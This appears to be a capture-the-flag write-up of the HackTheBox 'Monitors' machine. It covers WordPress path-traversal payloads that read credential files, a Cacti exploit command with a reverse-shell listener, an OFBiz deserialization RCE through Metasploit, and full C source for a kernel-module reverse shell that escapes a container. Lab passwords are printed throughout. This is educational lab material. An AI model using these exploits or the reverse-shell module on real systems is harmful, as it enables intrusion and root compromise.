## Synopsis

Monitors is a hard Linux machine that involves WordPress plugin exploitation leading to a command
injection via SQL injection through a well known network management web application in order to get
a shell on the system. Then by performing basic service file enumeration one can gain the user password
and thus a foothold to the system through SSH. The root stage consists of a Java based XML RPC
deserialization attack against Apache OFBiz to gain a shell in a Docker container. Then it is possible by
abusing the CAP_SYS_MODULE capability to load a malicious kernel module against the host and escalate
privileges to root.

## Portscan
```bash

```

## Reconaissance

### HTTP

let's added monitors.htb into hosts file then access the page

![](/assets/img/monitor/1.png)

I always use burpsuite when accessing a site because burpsuite has a scanning directory by default, in this case burpsuite can identify the target based on wordpress, that's good.

![](/assets/img/monitor/2.png)


there is available public exploit in [here](https://www.exploit-db.com/exploits/44544) for wp-with-spiritz, this plugin affected by Remote File Inclusion vulnerability. and you can see image below if we able to read /etc/passwd file.

![](/assets/img/monitor/3.png)

let's find `wp-config.php` because this file contains an information such as password, db, etc.

```bash
#payload
../../../wp-config.php
```

![](/assets/img/monitor/4.png)


```bash
BestAdministrator@2020!
```

tried login via ssh as marcus with that password without any luck, so back to enumerate more about the target. beside monitors used apache as web server, we can gather information from site-enable or site-available in directory /etc/apache2.

```bash
#payload
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enable/000-default.conf
```

find another domain with cacti-admin.monitors.htb, lets added into hosts file.

![](/assets/img/monitor/5.png)

find the cacti page

![](/assets/img/monitor/7.png)

you can read more about cacti in [here](https://www.cacti.net/), in short cacti is a tools for monitoring and fault management framework and also network graphing solutions.
in this box we identified version of cacti is 1.2.12, this version has `CVE-2020-14295`.
beside this exploitation need credentials and we already have it, let's exploit it

grab this exploit using `searchploit` tools

```bash
searchsploit -m php/webapps/49810.py
```

execute this command below will gain access you into system

```bash
python 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.8 --lport 9001
```

## Escalate Marcus User

inside sistem we cannot find tools `curl` and `wget`, so we can still use nc for transfer files, in this case im gonna put linpeas.sh for further enumeration.

target:
```bash
nc -l -p 9002 > linpeas.sh
```

host:
```bash
nc 10.10.10.238 9002 < linpeas.sh
```

unfortunately i dont get anything usefull about the result of linpeas.log, i already done with `find` command for filtering of user and group but only still see permission denied.
but when we use `grep` with option `-Rwi` for input string only will discover backup.sh file.

```bash
grep -Rwi "marcus"
```

![](/assets/img/monitor/14.png)

we can read those file and claim password for marcus

![](/assets/img/monitor/15.png)

```text
VerticalEdge2020
```

login via ssh for stable shell

## Privilege Escalation
read the note.txt will determine what we have to do next, talk about docker for production. Beside there is running port 8443 in locally, we can doing port forwarding via ssh to reach this port.

command for tunelling:

```bash
ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238
```

continuing the process in the browser with port 8443

![](/assets/img/monitor/16.png)

as you can see the version of tomcat is `9.0.31`, this version affected of Apache OFBiz XMLRPC Deserialization RCE vulnerability. 
you can grab the exploit script in [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/apache_ofbiz_deserialization.rb) and add the exploitation script to the metasploit tools.

During the exploitation process, several things need to be considered before carrying out exploitation including:

```
set rhost 127.0.0.1
set rport 8443
set forceexploit true
use payload linux/x86/shell/reverse_tcp
```

![](/assets/img/monitor/19.png)

and execute `exploit -j` command will obtain a session, to interact with session use command `session (id)`

![](/assets/img/monitor/20.png)

we're inside container, reuse linpeas.sh again will determining docker capabilities show up.

```bash

## CAP_SYS_MODULE
cap_sys_module allows the process to load and unload arbitary kernel modules. the kernel can be modified at will, subverting all, system security, container system, and cap_sys_module is one of common technique for container escaping.

create file reverse-shell.c and modify the ip address into docker host which is 172.17.0.1

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

//change host ip
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.1/9003 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

create Makefile for compiling the exploit code

```make
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

during the compiling process i retrive an error messages

![](/assets/img/monitor/21.png)

why this is happen ? The Linux operating system will go through all the directories in the PATH variable and check if the binary is in there (if so it gets executed).
The concept is left to right which means that the OS will first look in /usr/local/sbin, then in /usr/local/bin, then in /usr/sbin, ...

this can be done with export path where / is a directory(in this case), doing export path with following command:

```bash
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/8/
```

then re-execution `make` command again will compiling the exploit code without any error

![](/assets/img/monitor/22.png)

start listener on marcus session

```bash
nc -lnvp 9003
```

and execute command below in container for load our kernel module

```bash
insmod reverse-shell.ko
```

back again in marcus session will obtain root user
